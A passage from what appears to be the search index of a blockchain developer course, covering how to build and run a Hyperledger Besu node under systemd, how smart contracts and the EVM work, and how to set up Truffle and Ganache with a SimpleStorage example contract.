BUILD AND INSTALL STEPS"},{"location":"S02-ethereum/M6-Installing-besu/#summarised-build-steps","text":"- install dependencies : sudo apt install libsodium23 libnss3 - y - make a folder for code : mkdir ~/ code - navigate to the folder : cd ~/ code - clone the source code : git clone -- recursive https : // github . com / hyperledger / besu - navigate to source : cd besu - switch to a release branch ( to find these type : git branch - r ) e . g . git checkout release - 22 . 4 . 0 or stay on main for latest To see all of the gradle tasks that are available ( or just skip to installDist ) cd besu ( if not already ) . / gradlew installDist ( wait for it to complete )","title":"Summarised build steps"},{"location":"S02-ethereum/M6-Installing-besu/#install-steps","text":"Once the build steps are complete Copy the besu folder from the build folder to /usr/bin/ e.g. sudo cp -r ~/code/besu/build/install/besu /usr/bin/besu Check your besu version /usr/bin/besu/bin/besu --version Add user to run the process under e.g. sudo useradd username ( e.g. sudo useradd eth ) - for more in depth options on users: Creating users with useradd If using an internal disk - Assign ownership of the besu folder sudo chown -R eth:eth /besu (replace eth with your chosen username) - this is needed to create and maintain files If using a mounted disk - Assign ownership of the besu folder sudo chown -R eth:eth /mnt/ssd/besu - this is needed to create and maintain files Create a Service/Unit File type in sudo nano /etc/systemd/system/besu.service paste in the below after changing the following values: --sync-mode=FAST will create a non-archive node - use --sync-mode=FULL if you want the archive option change 192.168.50.18 to the earlier set IP in order to use it in your local network change YourIdentity to something that you want to use to identify your node --p2p-host can be changed to an external IP if fixed for discovery - default is 0.0.0.0 --data-path= should point to where you want to store the data ( /besu or /mnt/ssd/besu ) [Unit] Description = Besu daemon After = network-online.target Wants = network-online.target [Service] PermissionsStartOnly = true ExecStart = /usr/bin/besu/bin/besu --host-allowlist=\"*\" --data-storage-format=BONSAI --sync-mode=FAST --identity=YourIdentity --data-path=/mnt/ssd/besu --rpc-http-enabled --rpc-http-host=192.168.50.18 --rpc-http-port=8545 --rpc-http-cors-origins=\"*\" --nat-method=NONE --p2p-host=0.0.0.0 Restart = on-failure TimeoutStopSec = 600 # Directory creation and permissions #################################### User = eth Group = eth PrivateTmp = true # Mount /usr, /boot/ and /etc read-only for the process. ProtectSystem = full # Deny access to /home, /root and /run/user ProtectHome = true # Disallow the process and all of its children to gain new privileges # through execve(). NoNewPrivileges = true # Use a new /dev namespace only populated with API pseudo devices such as # /dev/null, /dev/zero and /dev/random. PrivateDevices = true [Install] WantedBy = multi-user.target press control-o and then after, press enter to save, followed by control-x to exit type sudo systemctl start besu - this should start the service type sudo systemctl status besu - this should show you the status - similar to: \u25cf besu . service - Besu daemon Loaded : loaded ( / etc / systemd / system / besu . service ; enabled ; vendor preset : enabled ) Active : active ( running ) since Sun 2022 - 06 - 26 19 : 37 : 21 UTC ; 15 h ago Main PID : 726 ( java ) Tasks : 78 ( limit : 13869 ) Memory : 10.6 G CPU : 9 h 5 min 48.784 s CGroup : / system . slice / besu . service \u2514\u2500 726 java - Dvertx . disableFileCPResolving = true - Dbesu . home =/ usr / bin / besu - Dlog4j . shutdownHookEnabled = false - Dlog4j2 . formatMsgNoLookups = true - Djava . util . logging . manager = org . apache . logging . log4j . jul . LogManager -- add - opens java . base / sun . security . provider = ALL - UNNAMED -- add - opens java . base / java . util = ALL - UNNAMED - Dio . netty . tryReflectionSetAccessible = true -- add - exports java . base / jdk . internal . misc = ALL - UNNAMED -- add - ope > type sudo systemctl enable besu - this will let it start on reboot Monitoring the service - type tail -f /var/log/syslog to follow the logs control-c to exit - type sudo systemctl status besu to see if it is running - type dstat to see the disk usage - if it sits at 0 for a long time it may be stalled - create a get block script - type sudo nano getBlock.sh - paste in the following changing the IP address (192.168.50.18) to your server IP ``` #!/bin/bash val=$(curl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_blockNumber\",\"params\":[],\"id\":51}' http://192.168.50.18:8545 --silent | jq -r '.result') echo $(($val)) ``` press control-o and then after, press enter to save, followed by control-x to exit type sudo chmod +x getBlock.sh to allow it to be executed to run it type ./getBlock.sh - this will tell you how far it has gotten additional commands you can create scripts with (e.g. eth_syncing ) - see API","title":"Install Steps"},{"location":"S02-ethereum/M6-Installing-besu/#connecting-to-your-node-with-metamask","text":"You should, once your node has synced (you should be seeing lines like the below one) be able to connect to Metamask locally: Jul 6 00:15:37 besutestbed besu[124324]: 2022-07-06 00:15:37.663+00:00 | EthScheduler-Workers-2 | INFO | PersistBlockTask | Imported #15,085,695 / 17 tx / 0 om / 1,828,694 (6.1%) gas / (0x22135e43ea450cf089fe8d0916a82a3598516badc9363df7bc8e86b1dfbf71da) in 0.289s. Peers: 54 Create a new connection under settings, give the ChainId as 1, node address as http://YOURIP:8545 and a name. You can also add the Symbol as ETH. Android Metamask Mobile requires an https site - another article will show you how to create a reverse proxy to your node. All other Metamask mobile and desktop ones work without the https.","title":"Connecting to your node with Metamask"},{"location":"S02-ethereum/M6-Installing-besu/#final-thoughts-and-security-considerations","text":"","title":"Final thoughts and security considerations"},{"location":"S02-ethereum/M6-Installing-besu/#ports-and-port-forwarding","text":"It is possible to sync without opening external ports into your network, however this means all peer initiation and finding will purely be from your node, which potentially will be slower. If you do decided to open a port and forward it into your network, it should only ever be port 30303 for peering . As with any port opening and forwarding, do so with caution. What is port forwarding . You might consider adding in a firewall to be more secure.","title":"Ports and port forwarding"},{"location":"S02-ethereum/M6-Installing-besu/#segementing-internal-networks","text":"If you are up for more advanced networking and your hardware supports it, you could consider creating different VLANs on your network disallowing the node to talk out to your internal network, but you can talk into it to use it as your RPC endpoint for your wallet (e.g. Metamask).","title":"Segementing internal networks"},{"location":"S02-ethereum/M6-Installing-besu/#publicly-exposed-ip-addresses","text":"If you are a home user running a node, please keep in mind that your IP address will be visible to other node operators giving them a rough idea of your geolocation. Additionally, if your port forwarding is open, sites such as ethernodes will index your IP. From a privacy perspective, you may want to run your node over a dedicated IP VPN. Keep in mind this may require other hardware and technical skill.","title":"Publicly exposed IP Addresses"},{"location":"S02-ethereum/M6-Installing-besu/#outdate-software-and-operating-system","text":"always check for and apply updates sudo apt update && sudo apt upgrade -y","title":"Outdate software and operating system"},{"location":"S02-ethereum/M6-Installing-besu/#future-considerations","text":"EIP-4844 - 30 days worth of 10mb rolled up data","title":"Future Considerations"},{"location":"S02-ethereum/M6-Installing-besu/#resources","text":"https://consensys.net/blog/news/bonsai-tries-a-big-update-for-small-state-storage-in-hyperledger-besu/ https://besu.hyperledger.org/en/stable/HowTo/Get-Started/Installation-Options/Options/ https://wiki.hyperledger.org/display/BESU/Building+from+source https://blog.developerdao.com/eip-4844-and-its-impact-on-ethereum-scalability https://www.freedesktop.org/software/systemd/man/systemd.exec.html https://netplan.io/examples/ https://ubuntu.com/server/docs/install/step-by-step https://linuxize.com/post/how-to-add-swap-space-on-ubuntu-20-04/ https://linuxize.com/post/how-to-create-users-in-linux-using-the-useradd-command/ https://cybernews.com/what-is-vpn/port-forwarding/ https://ethernodes.org/ https://besu.hyperledger.org/en/stable/Reference/API-Methods/","title":"Resources"},{"location":"S03-smart-contracts/M1-mental-model/L1-mental-model-sc/","text":"Where Do Smart Contracts Fit in Our Mental Model? In this chapter, we're going to dive deeper into smart contracts : What they are, how they work and how you can build with them safely. First, a general definition. Smart contracts are programs deployed to a blockchain network that automatically execute when triggered by valid transactions. A basic analogy for a smart contract is a vending machine: The customer puts in money, punches in the code of the desired item. Assuming a valid input, the vending machine will release the desired item. The following properties are desired in any smart contract system: - Trustless Meaning two or more parties can act on an agreement without relying on any intermediary to facilitate the transaction - Universally Accessible Meaning every participant must be able to access and use the system. They should not have to rely on anyone\u2019s approval to participate in the network. - Traceable Contract transactions should be traceable. Data provenance is critical to resolving disputes and for legal compliance. - Immutable transactions Transactions should be irreversible (atomic). Participants should not be able to revoke their decisions, just as legal contracts are binding, so are smart contracts. - Self executing We want to move as far away from manual implementation as possible and have these contracts be automatic. The extent that the self executing contract is self executing is subject to use case variability. To understand where smart contracts fit into blockchains, let's review the blockchain mental model we constructed in the first chapter. Let's zoom into the Network Interface \u2014 Consensus Protocol \u2014 Network State elements on the lower left corner. We'll also update the names for the Ethereum network: The Ethereum Virtual Machine (EVM) is a secure execution environment for smart contracts. EVM bytecode is executed on the Ethereum Virtual Machine and the outcome constitutes the new world state. The EVM is Turing-complete, meaning it can execute more advanced code than the Bitcoin network. However, to make sure transactions don't loop forever, transactions on the Ethereum network also have gas limits, as we've discussed. EVM bytecode is machine code, meaning it's very difficult for humans to read or program in. However, core developers have built higher-order smart contract languages that compile to EVM bytecode. One well-known higher-order smart contract language that compiles down to EVM bytecode is Solidity . Here's a diagram showing how Solidity code compiles down into EVM bytecode, which is then deployed to the Ethereum network: Smart Contract Workflows: Creation and Execution There are two practical types of transactions involving smart contracts: Contract creation and Message call The image below shows the contract creation process. When a smart contract is deployed to the network, the code is initialized and states are created with addresses. Here, we can see the high-level process of the EVM executing a transaction to a smart contract. The transaction includes input data, which is fed into the smart contract bytecode. The outcome of the transaction contributes to the network state change. Let's look further into how the EVM handles deployed bytecode and contract data when it executes a transaction's EVM bytecode. While there are a lot of elements to this picture, try to keep in mind we are looking at a simple state machine. State is fed into the stack, the EVM processes the stack, and the result is either saved, if it affects the network state, or discarded, if it was only necessary for the transaction execution. The state in the EVM stack is in three areas: * Memory This is volatile memory, meaning that, unless it is explicitly written back into the network state, will only be accessible during the transaction execution. * Storage This is persistent memory taken from the network state. Read and writing to the network state is more expensive, gas-wise, than memory, since it affects the global state of the network. * Stack The information processed by the EVM stack while going through the bytecode. (Stack is a data structure used by all computer processors, you can learn more about it here ) When the EVM wishes to process a transaction, it first takes the input data, fetches the relevant contract bytecode and any world state account storage data. Then, the EVM processes the transaction data through the stack data type. Last, after the EVM has finished processed the transaction, it takes any world state data altered by the transaction and writes those changes to the world state. The diagram below illustrates this process (note that PC is the Program Counter, essentially keeping track of the steps to measure gas): The handling of memory and storage in the transaction execution process can be one of the hardest challenges for new developers in the space. We'll go over it more in the Solidity section, but be aware it's a different level of programming than a typical JavaScript or Python developer encounters. New Development and Security Considerations The process we've just outlined contains many challenges for developers entering the space, such as: * Smart contracts are immutable They cannot be modified (only re-deployed). A common web development mantra is \u201cmove fast and break things\u201d. This is not advisable in smart contract development due to this immutability. * High cost of failure Typical software development that is this accessible does not involve potentially losing tremendous financial value. You're more likely to encounter this level of scrutiny and security in hardware and financial services programming. * Smart contracts information is public and anyone can call your public functions Once your code is deployed and particularly if it starts accruing value, it will attract more opportunities for it to be hacked or misused. In this section, we hope to both equip you with the ability to code smart contracts but also protect yourself and anyone interacting with your code. Most of all, we hope to instill in you a healthy sense of paranoia and fear about the code you deploy to public networks. However, we will also show you how to deal with this terror by protecting your code with smart and secure tools. Additional Material Wikipedia: Smart Contracts, Stack (Abstract data type) Video: Turing Complete (Computerphile) Video describing what it means for a language to be Turing complete, the difference between the Bitcoin execution environment and the EVM is the EVM is Turing complete. Wiki: Ethereum Virtual Machine (Ethereum.org) A deep dive describing the EVM Slides: Ethereum VM Illustrated (Takenobu T.) A slide deck describing the Ethereum VM. Many of the diagrams in this section are from this slide deck","title":"Index"},{"location":"S03-smart-contracts/M1-mental-model/L1-mental-model-sc/#where-do-smart-contracts-fit-in-our-mental-model","text":"In this chapter, we're going to dive deeper into smart contracts : What they are, how they work and how you can build with them safely. First, a general definition. Smart contracts are programs deployed to a blockchain network that automatically execute when triggered by valid transactions. A basic analogy for a smart contract is a vending machine: The customer puts in money, punches in the code of the desired item. Assuming a valid input, the vending machine will release the desired item. The following properties are desired in any smart contract system: - Trustless Meaning two or more parties can act on an agreement without relying on any intermediary to facilitate the transaction - Universally Accessible Meaning every participant must be able to access and use the system. They should not have to rely on anyone\u2019s approval to participate in the network. - Traceable Contract transactions should be traceable. Data provenance is critical to resolving disputes and for legal compliance. - Immutable transactions Transactions should be irreversible (atomic). Participants should not be able to revoke their decisions, just as legal contracts are binding, so are smart contracts. - Self executing We want to move as far away from manual implementation as possible and have these contracts be automatic. The extent that the self executing contract is self executing is subject to use case variability. To understand where smart contracts fit into blockchains, let's review the blockchain mental model we constructed in the first chapter. Let's zoom into the Network Interface \u2014 Consensus Protocol \u2014 Network State elements on the lower left corner. We'll also update the names for the Ethereum network: The Ethereum Virtual Machine (EVM) is a secure execution environment for smart contracts. EVM bytecode is executed on the Ethereum Virtual Machine and the outcome constitutes the new world state. The EVM is Turing-complete, meaning it can execute more advanced code than the Bitcoin network. However, to make sure transactions don't loop forever, transactions on the Ethereum network also have gas limits, as we've discussed. EVM bytecode is machine code, meaning it's very difficult for humans to read or program in. However, core developers have built higher-order smart contract languages that compile to EVM bytecode. One well-known higher-order smart contract language that compiles down to EVM bytecode is Solidity . Here's a diagram showing how Solidity code compiles down into EVM bytecode, which is then deployed to the Ethereum network:","title":"Where Do Smart Contracts Fit in Our Mental Model?"},{"location":"S03-smart-contracts/M1-mental-model/L1-mental-model-sc/#smart-contract-workflows-creation-and-execution","text":"There are two practical types of transactions involving smart contracts: Contract creation and Message call The image below shows the contract creation process. When a smart contract is deployed to the network, the code is initialized and states are created with addresses. Here, we can see the high-level process of the EVM executing a transaction to a smart contract. The transaction includes input data, which is fed into the smart contract bytecode. The outcome of the transaction contributes to the network state change. Let's look further into how the EVM handles deployed bytecode and contract data when it executes a transaction's EVM bytecode. While there are a lot of elements to this picture, try to keep in mind we are looking at a simple state machine. State is fed into the stack, the EVM processes the stack, and the result is either saved, if it affects the network state, or discarded, if it was only necessary for the transaction execution. The state in the EVM stack is in three areas: * Memory This is volatile memory, meaning that, unless it is explicitly written back into the network state, will only be accessible during the transaction execution. * Storage This is persistent memory taken from the network state. Read and writing to the network state is more expensive, gas-wise, than memory, since it affects the global state of the network. * Stack The information processed by the EVM stack while going through the bytecode. (Stack is a data structure used by all computer processors, you can learn more about it here ) When the EVM wishes to process a transaction, it first takes the input data, fetches the relevant contract bytecode and any world state account storage data. Then, the EVM processes the transaction data through the stack data type. Last, after the EVM has finished processed the transaction, it takes any world state data altered by the transaction and writes those changes to the world state. The diagram below illustrates this process (note that PC is the Program Counter, essentially keeping track of the steps to measure gas): The handling of memory and storage in the transaction execution process can be one of the hardest challenges for new developers in the space. We'll go over it more in the Solidity section, but be aware it's a different level of programming than a typical JavaScript or Python developer encounters.","title":"Smart Contract Workflows: Creation and Execution"},{"location":"S03-smart-contracts/M1-mental-model/L1-mental-model-sc/#new-development-and-security-considerations","text":"The process we've just outlined contains many challenges for developers entering the space, such as: * Smart contracts are immutable They cannot be modified (only re-deployed). A common web development mantra is \u201cmove fast and break things\u201d. This is not advisable in smart contract development due to this immutability. * High cost of failure Typical software development that is this accessible does not involve potentially losing tremendous financial value. You're more likely to encounter this level of scrutiny and security in hardware and financial services programming. * Smart contracts information is public and anyone can call your public functions Once your code is deployed and particularly if it starts accruing value, it will attract more opportunities for it to be hacked or misused. In this section, we hope to both equip you with the ability to code smart contracts but also protect yourself and anyone interacting with your code. Most of all, we hope to instill in you a healthy sense of paranoia and fear about the code you deploy to public networks. However, we will also show you how to deal with this terror by protecting your code with smart and secure tools.","title":"New Development and Security Considerations"},{"location":"S03-smart-contracts/M1-mental-model/L1-mental-model-sc/#additional-material","text":"Wikipedia: Smart Contracts, Stack (Abstract data type) Video: Turing Complete (Computerphile) Video describing what it means for a language to be Turing complete, the difference between the Bitcoin execution environment and the EVM is the EVM is Turing complete. Wiki: Ethereum Virtual Machine (Ethereum.org) A deep dive describing the EVM Slides: Ethereum VM Illustrated (Takenobu T.) A slide deck describing the Ethereum VM. Many of the diagrams in this section are from this slide deck","title":"Additional Material"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L1-background/","text":"Introduction to Truffle Suite Before we go into the Solidity section, we want to make sure you have a place where you can play around with the Solidity code you're starting to learn. Enter the Truffle Suite! Truffle is an excellent tool to learn Solidity development but, as we'll show later in the course, it's also got advanced features. Don't be deceived by how easy it is! History and Evolution As with any emergent ecosystem, tooling in the early days of EVM-based dapp development was somewhat primitive. Developers were required to install and utilize multiple, disjointed tools and services making for a complex workflow with a steep learning curve. Things have come a long way since then, with tools and services like Codefi, Infura, Metamask, and OpenZeppelin Contracts that simplify a significant number of smart contract software development lifecycle stages. Despite these advancements, there are still numerous pitfalls, particularly related to the security of your contracts, which makes web3 development different to what you might be used to when building against a more centralized paradigms. Why Truffle Suite? The Truffle Suite was built to streamline the smart contract development process. Out of the box it includes a large, and growing, collection of commands that you can execute as you write, troubleshoot, and maintain your smart contracts. A good example of this is contract compilation (wherein you convert your high-level contract code to something that can be natively understood by an Ethereum-node). As part of this feature, Truffle can also intelligently download the necessary compiler version(s) and even enable you to write your contracts in different language versions. Additional reasons why developers might use Truffle to build their dapps include the following... Built-in support for compiling, deploying and linking your contract An automated contract testing framework built on Mocha and Chai A built-in console that allows you to directly interact with your compiled contracts This is just scratching the surface; as you\u2019ll see when we dive-in, the Truffle Suite and the broader tooling ecosystem makes your life as a dapp developer both productive and fun! Installation The following walks you through installation of both Truffle CLI and Ganache. Truffle CLI The Truffle Suite requires the following... Node.js v8.9.4 or later NPM v5.0.3 or later Windows, Linux or Mac OS X Truffle also requires that you have a running Ethereum client which supports the standard JSON RPC API (which is nearly all of them). While there are many clients, the Truffle Suite also ships with Ganache, essentially a one-click EVM-based blockchain node for local testing. Once you have the proper Node and npm installed, please run the following command from your terminal to install Truffle: $ npm install -g truffle Once successful, this will allow you to run Truffle from your command line anywhere on your machine. Note: In case you run into errors due to write permission on your local machine, try to run the command preceded by sudo : $ sudo npm install -g truffle Ganache Ganache has the same requirements as Truffle (as specified above). In addition, it also comes in two flavors, both a standalone CLI for more intermediate-advanced users and a UI version which is great for users that are just starting out. It\u2019s worth noting that a version of Ganache also ships directly with Truffle which can be instantiated with the truffle develop command. Ganache CLI can be installed via the following: $ npm install -g ganache-cli Note: In case you run into errors due to write permission on your local machine, try to run the command preceded by sudo : $ sudo npm install -g ganache-cli Ganache UI is available as download here. You can also install the latest beta (at the time of writing) that includes Filecoin support here. Congratulations! You've just successfully installed Truffle and Ganache and are ready to get started developing. Introducing the Truffle Suite Now that we have Truffle (and optionally a standalone Ganache version) installed we\u2019re nearly ready to begin diving in and writing our first smart contract. We'd like to cover a few more things before diving in. Network Support As we discussed previously in the course, we are living in an increasingly multi-chain world. There multiple popular public blockchain networks and Truffle Suite aims to serve as many of these as is realistic. At the time of writing, Truffle Suite supports development on the following networks: Ethereum Quorum Hyperledger Fabric Corda Filecoin Tezos Polygon Arbritrum Optimism PBC That said, Truffle\u2019s richest support is for that of EVM (Ethereum Virtual Machine) based blockchains. This is in part due to Truffle\u2019s lineage and the fact that supporting every blockchain would be futile, particularly given the rapid evolution of the space. Given the above, the bulk of this section of the course will be specifically focused on EVM based chains (unless specified otherwise). Language Support As highlighted earlier, amongst many other things, Truffle handles the compilation of your contracts from that of a higher-level language to Ethereum bytecode, which is the language \u201cspoken\u201d by the nodes on the network. Out of the box, Truffle supports the following: Solidity Vyper Yul (experimental and not for beginners) At the time of writing, Solidity is by far the most popular language for writing smart contracts, and as with everything in the space, things have been moving rapidly and have now witnessed some major projects built using Vyper. Core Truffle Commands Truffle is built around a large collection of commands that are used as a part of the contract development workflow. Examples of these include: truffle init truffle compile truffle test truffle debug truffle migrate Note that you can see a complete list of the available commands by running truffle help . As you can likely infer from the commands, they map to key stages of the development lifecycle. More on this in the upcoming section! Truffle Boxes Up until now we\u2019ve been writing all the code, scripts, and config ourselves and while this follows the mantra of \u201clearning by doing\u201d, there\u2019s another great resource at your disposal and that is Truffle boxes . Learning with Truffle boxes As per the description, boxes are \u201chelpful boilerplates\u201d that comprise of sample contracts, front-end code (using a variety of different frameworks), and applied boxes that focus on a particular theme or protocol such as L2. From a learning standpoint they\u2019re a useful to way to augment your learning by immediately getting hands-on. At the time of writing, here are some good boxes: Layer 2 (examples targeting Optimism, Arbitrum, and Polygon respectively) Filecoin Aave Flashloan example Oracles with ChainLink Installing a box is simply a case of using the unbox command, for example: $ truffle unbox optimism Beyond this, simply follow along with the optimism box readme . We'll discuss boxes more when we dive deeper into developer tooling and more advanced Truffle, but feel free to explore available boxes. Two popular boxes for folks new to Truffle are Petshop and Metacoin. In the next section, we'll take a simple smart contract and use it to explore the initial commands for developing using Truffle.","title":"Index"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L1-background/#introduction-to-truffle-suite","text":"Before we go into the Solidity section, we want to make sure you have a place where you can play around with the Solidity code you're starting to learn. Enter the Truffle Suite! Truffle is an excellent tool to learn Solidity development but, as we'll show later in the course, it's also got advanced features. Don't be deceived by how easy it is!","title":"Introduction to Truffle Suite"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L1-background/#history-and-evolution","text":"As with any emergent ecosystem, tooling in the early days of EVM-based dapp development was somewhat primitive. Developers were required to install and utilize multiple, disjointed tools and services making for a complex workflow with a steep learning curve. Things have come a long way since then, with tools and services like Codefi, Infura, Metamask, and OpenZeppelin Contracts that simplify a significant number of smart contract software development lifecycle stages. Despite these advancements, there are still numerous pitfalls, particularly related to the security of your contracts, which makes web3 development different to what you might be used to when building against a more centralized paradigms.","title":"History and Evolution"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L1-background/#why-truffle-suite","text":"The Truffle Suite was built to streamline the smart contract development process. Out of the box it includes a large, and growing, collection of commands that you can execute as you write, troubleshoot, and maintain your smart contracts. A good example of this is contract compilation (wherein you convert your high-level contract code to something that can be natively understood by an Ethereum-node). As part of this feature, Truffle can also intelligently download the necessary compiler version(s) and even enable you to write your contracts in different language versions. Additional reasons why developers might use Truffle to build their dapps include the following... Built-in support for compiling, deploying and linking your contract An automated contract testing framework built on Mocha and Chai A built-in console that allows you to directly interact with your compiled contracts This is just scratching the surface; as you\u2019ll see when we dive-in, the Truffle Suite and the broader tooling ecosystem makes your life as a dapp developer both productive and fun!","title":"Why Truffle Suite?"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L1-background/#installation","text":"The following walks you through installation of both Truffle CLI and Ganache. Truffle CLI The Truffle Suite requires the following... Node.js v8.9.4 or later NPM v5.0.3 or later Windows, Linux or Mac OS X Truffle also requires that you have a running Ethereum client which supports the standard JSON RPC API (which is nearly all of them). While there are many clients, the Truffle Suite also ships with Ganache, essentially a one-click EVM-based blockchain node for local testing. Once you have the proper Node and npm installed, please run the following command from your terminal to install Truffle: $ npm install -g truffle Once successful, this will allow you to run Truffle from your command line anywhere on your machine. Note: In case you run into errors due to write permission on your local machine, try to run the command preceded by sudo : $ sudo npm install -g truffle","title":"Installation"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L1-background/#ganache","text":"Ganache has the same requirements as Truffle (as specified above). In addition, it also comes in two flavors, both a standalone CLI for more intermediate-advanced users and a UI version which is great for users that are just starting out. It\u2019s worth noting that a version of Ganache also ships directly with Truffle which can be instantiated with the truffle develop command. Ganache CLI can be installed via the following: $ npm install -g ganache-cli Note: In case you run into errors due to write permission on your local machine, try to run the command preceded by sudo : $ sudo npm install -g ganache-cli Ganache UI is available as download here. You can also install the latest beta (at the time of writing) that includes Filecoin support here. Congratulations! You've just successfully installed Truffle and Ganache and are ready to get started developing.","title":"Ganache"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L1-background/#introducing-the-truffle-suite","text":"Now that we have Truffle (and optionally a standalone Ganache version) installed we\u2019re nearly ready to begin diving in and writing our first smart contract. We'd like to cover a few more things before diving in.","title":"Introducing the Truffle Suite"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L1-background/#network-support","text":"As we discussed previously in the course, we are living in an increasingly multi-chain world. There multiple popular public blockchain networks and Truffle Suite aims to serve as many of these as is realistic. At the time of writing, Truffle Suite supports development on the following networks: Ethereum Quorum Hyperledger Fabric Corda Filecoin Tezos Polygon Arbritrum Optimism PBC That said, Truffle\u2019s richest support is for that of EVM (Ethereum Virtual Machine) based blockchains. This is in part due to Truffle\u2019s lineage and the fact that supporting every blockchain would be futile, particularly given the rapid evolution of the space. Given the above, the bulk of this section of the course will be specifically focused on EVM based chains (unless specified otherwise).","title":"Network Support"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L1-background/#language-support","text":"As highlighted earlier, amongst many other things, Truffle handles the compilation of your contracts from that of a higher-level language to Ethereum bytecode, which is the language \u201cspoken\u201d by the nodes on the network. Out of the box, Truffle supports the following: Solidity Vyper Yul (experimental and not for beginners) At the time of writing, Solidity is by far the most popular language for writing smart contracts, and as with everything in the space, things have been moving rapidly and have now witnessed some major projects built using Vyper.","title":"Language Support"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L1-background/#core-truffle-commands","text":"Truffle is built around a large collection of commands that are used as a part of the contract development workflow. Examples of these include: truffle init truffle compile truffle test truffle debug truffle migrate Note that you can see a complete list of the available commands by running truffle help . As you can likely infer from the commands, they map to key stages of the development lifecycle. More on this in the upcoming section!","title":"Core Truffle Commands"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L1-background/#truffle-boxes","text":"Up until now we\u2019ve been writing all the code, scripts, and config ourselves and while this follows the mantra of \u201clearning by doing\u201d, there\u2019s another great resource at your disposal and that is Truffle boxes .","title":"Truffle Boxes"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L1-background/#learning-with-truffle-boxes","text":"As per the description, boxes are \u201chelpful boilerplates\u201d that comprise of sample contracts, front-end code (using a variety of different frameworks), and applied boxes that focus on a particular theme or protocol such as L2. From a learning standpoint they\u2019re a useful to way to augment your learning by immediately getting hands-on. At the time of writing, here are some good boxes: Layer 2 (examples targeting Optimism, Arbitrum, and Polygon respectively) Filecoin Aave Flashloan example Oracles with ChainLink Installing a box is simply a case of using the unbox command, for example: $ truffle unbox optimism Beyond this, simply follow along with the optimism box readme . We'll discuss boxes more when we dive deeper into developer tooling and more advanced Truffle, but feel free to explore available boxes. Two popular boxes for folks new to Truffle are Petshop and Metacoin. In the next section, we'll take a simple smart contract and use it to explore the initial commands for developing using Truffle.","title":"Learning with Truffle boxes"},{"location":"S03-smart-contracts/M2-intro-to-truffle/L2-intro-tutorial/","text":"Truffle Suite Deep Dive As with most things, the best way to learn is by doing, so without further ado let\u2019s dive into a hands on example of using Truffle. In this example we\u2019ll be leveraging some of the core Truffle commands to build the decentralized equivalent of a \u201cHello World!\u201d program, \u201cSimpleStorage\u201d. As the name suggests, this example will provide a means of both storing some on-chain data (essentially state stored indefinitely on the blockchain) and subsequently retrieving this state. Note: If you\u2019re going to be following along, this example assumes you followed the steps last lesson to successfully install Truffle Initialize an Empty Project Let\u2019s begin by creating an empty project using the init command. In a new directory (e.g. \u201cSimpleStorage\u201d) and from your terminal, run the following command. $ truffle init Assuming everything worked successfully you should see the following output and a number of directories (contracts, migrations, etc) created in the current directory. Starting init... ================ > Copying project files to /Users/bluer/Developer/temp Init successful, sweet! Try our scaffold commands to get started: $ truffle create contract YourContractName # scaffold a contract $ truffle create test YourTestName # scaffold a test http://trufflesuite.com/docs Congratulations, you now have a bare bones project! Next up, let\u2019s create a contract within which we\u2019ll be able to store our SimpleStorage project\u2019s code. Create a Contract Truffle provides a create command with which you can achieve this, although as we'll show later it\u2019s often just as easy to create the file via your favorite editor environment. $ truffle create contract SimpleStorage This will create a new Solidity (note that this is the default language) file, SimpleStorage.sol within your contracts directory. Using a code editor, or using something like nano from the command line, paste the following Solidity code into the SimpleStorage.sol file and save: // SPDX-License-Identifier : MIT pragma solidity >= 0 . 4 . 21 < 0 . 7 . 0 ; contract SimpleStorage { uint storedData ; function set(uint x) public { storedData = x ; } function get () public view returns ( uint ) { return storedData ; } } Sweet, your first contract! Now let\u2019s try out the compile command we saw earlier. Compilation, baby! Running the compile command from your terminal like the following: $ truffle compile Compiling your contracts... =========================== > Compiling ./contracts/Migrations.sol > Compiling ./contracts/SimpleStorage.sol > Artifacts written to /Users/bluer/Developer/temp/build/contracts > Compiled successfully using: - solc: 0.5.16+commit.9c3226ce.Emscripten.clang Assuming all went smoothly, Truffle should have compiled your contract and added the resultant output (something referred to as build artifacts that we\u2019ll explore in more detail later) to build/contracts/SimpleStorage.json . Note that you\u2019ll also likely see some references to Migrations. This is a mechanism used by Truffle to store the details related to the last migration (deployment) on-chain. Next up we\u2019re going to explore deploying our contract to a simulation of a blockchain network using Ganache. Migrating (or Deploying) Your Contract So we\u2019ve created and compiled a contract, but now we need somewhere to deploy it so we can begin testing. This is where Ganache comes in! As alluded to earlier, Ganache comes in a number of different flavors. For ease we\u2019re going to start by using the version built directly into Truffle itself (more on standalone Ganache CLI and Ganache UI shortly). To achieve this we can use Truffle\u2019s develop command which both starts up a Ganache instance and provides us with an interactive REPL with which we can actually interact with our contracts. $ truffle develop And you should see this, if successful: Truffle Develop started at http : // 127 . 0 . 0 . 1 : 9545 / Accounts : ( 0 ) 0 x5ca1605d4671669b38f7e37c881ed996ede5ac68 \u2026 Private Keys : ( 0 ) dd7a8c358901b0f572e461585c9ab27f92b24902c45859114776af12077cb208 \u2026 Mnemonic : cloth either reunion project inflict inside ghost welcome tip lemon again knee \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle . It is not secure . Ensure you do not use it on production blockchains , or else you risk losing funds . truffle ( develop ) > We\u2019ll be glossing over the details of the above output for the moment, other than to say it gives us access to 10 pre-funded accounts (as a default) that we can leverage as a means of interacting contracts. Before we actually migrate our contract we\u2019ll need to create a migration script. This step enables you to granularly instruct Truffle how to migrate your contracts, including things like constructor arguments. In the migrations directory create a file called 2_deploy_contracts.js and copy into that file the following: var SimpleStorage = artifacts . require ( \"./SimpleStorage.sol\" ); module . exports = function ( deployer ) { deployer . deploy ( SimpleStorage ); }; The numerical prefix of 2_deploy_contracts.js is actually important for two reasons. First, it dictates the order in which scripts are executed. Second, it\u2019s the index stored on-chain by the Migration.sol to keep track of successful migrations per its last_completed_migration value. Now that we have a migration script ready to go we can migrate as follows. Since we\u2019re doing this migration from the Truffle console we started with truffle develop , you can 